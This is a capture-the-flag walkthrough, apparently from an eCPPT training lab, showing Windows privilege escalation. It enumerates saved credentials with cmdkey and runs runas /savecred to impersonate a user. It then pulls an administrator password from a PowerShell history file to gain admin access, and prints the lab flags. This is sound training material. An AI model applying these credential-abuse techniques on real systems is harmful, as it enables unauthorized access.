# Privilege Escalation CTF 1 - Walkthrough

## Overview

This CTF is part of the eCPPT (eLearnSecurity Certified Professional Penetration Tester) Labs and is designed to simulate a real-world privilege escalation scenario on a Windows target. The goal is to escalate privileges from a standard user account to administrator and capture two flags along the way.

---

## üéØ Objective

* Start from limited user access.
* Escalate to a higher-privileged account.
* Locate and exfiltrate two flags.

---

## üß∞ Tools & Environment

* Windows 10 target machine.
* PowerShell / CMD.
* Built-in Windows tools (no external binaries).

---

## üèÅ Flag 1 - User-Level Access (john)

### Step 1: Enumerate Stored Credentials

From the default `student` user, enumerate stored credentials:

```powershell
cmdkey /list
```

Output:

```
Target: Domain:interactive=EC2AMAZ-A251FFF\john
Type: Domain Password
User: EC2AMAZ-A251FFF\john
```

### Step 2: Impersonate john using Stored Credentials

```powershell
runas.exe /savecred /user:john cmd
```

Confirmed with:

```cmd
whoami
```

```
ec2amaz-a251fff\john
```

### Step 3: Explore User's Home Directory

```cmd
cd C:\Users\john\Desktop\john-data
```

```cmd
dir
```

Found:

* `data.txt`
* `flag1.txt`

### Step 4: Read First Flag

```cmd
type flag1.txt
```

**Flag 1:** `fa9598968df8452a80267dd377fc77bc`

---

## üõó Flag 2 - Privilege Escalation to Administrator

### Step 5: Investigate PowerShell History

Navigate to PowerShell history file:

```cmd
cd C:\Users\john\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
```

```cmd
type ConsoleHost_History.txt
```

Found hardcoded credentials:

```powershell
$username = 'administrator'
$passwd = "superStrong_123890"
```

### Step 6: Use Credentials to Escalate

```cmd
runas /user:administrator cmd
```

Input password when prompted.

Confirm privilege escalation:

```cmd
whoami
```

```
ec2amaz-a251fff\administrator
```

### Step 7: Retrieve Second Flag

```cmd
cd C:\Users\Administrator
```

```cmd
type flag2.txt
```

**Flag 2:** `21b72b0bfa2144bba6b5c4ccd33ef1c2`

---

## ‚úÖ Conclusion

This lab successfully demonstrated privilege escalation on a Windows system:

* Exploited saved credentials to impersonate a local user.
* Analyzed PowerShell history to discover hardcoded administrator credentials.
* Used `runas` for privilege escalation.
* Retrieved both flags.

---
